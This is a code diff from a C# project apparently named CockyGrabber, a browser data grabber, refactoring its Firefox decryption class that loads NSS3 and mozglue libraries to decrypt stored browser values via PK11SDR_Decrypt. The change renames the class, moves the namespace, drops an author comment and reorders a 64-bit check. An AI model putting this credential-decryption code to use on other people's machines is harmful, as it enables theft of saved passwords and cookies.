@@ -1,12 +1,9 @@
-﻿/*
-    Coded by github.com/0xPh0enix
-*/
-using System;
+﻿using System;
 using System.Text;
 using System.Runtime.InteropServices;
 using System.IO;
 
-namespace CockyGrabber.Utility
+namespace CockyGrabber.Utility.Cryptography
 {
     internal sealed class WinApi
     {
@@ -38,7 +35,7 @@ namespace CockyGrabber.Utility
         [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
         public delegate int Pk11SdrDecrypt(ref TSECItem tsData, ref TSECItem tsResult, int iContent);
     }
-    public static class FirefoxDecryptor
+    internal static class GeckoDecryptor
     {
         private static IntPtr hNss3;
         private static IntPtr hMozGlue;
@@ -57,14 +54,14 @@ namespace CockyGrabber.Utility
         /// <returns>True if everything was successful</returns>
         public static bool LoadNSS(string mozillaPath)
         {
+            if (!Environment.Is64BitProcess)
+                throw new GrabberException(GrabberError.ProcessIsNot64Bit, "The current process is 32-bit! To decrypt firefox values it needs to be 64-bit");
+
             if (!File.Exists(mozillaPath + MozGlueDll)) // Check If DLL Exists
                 throw new GrabberException(GrabberError.Nss3NotFound, $"MozGlue was not found: {mozillaPath + MozGlueDll}");
 
             if (!File.Exists(mozillaPath + NssDll)) // Check If DLL Exists
                 throw new GrabberException(GrabberError.Nss3NotFound, $"NSS3 was not found: {mozillaPath + NssDll}");
-
-            if (!Environment.Is64BitProcess)
-                throw new GrabberException(GrabberError.ProcessIsNot64Bit, "The current process is 32-bit! To decrypt firefox values it needs to be 64-bit");
 
             // Load libraries with the WinApi:
             hMozGlue = WinApi.LoadLibrary(mozillaPath + MozGlueDll); // This is necessary to make Nss3 work
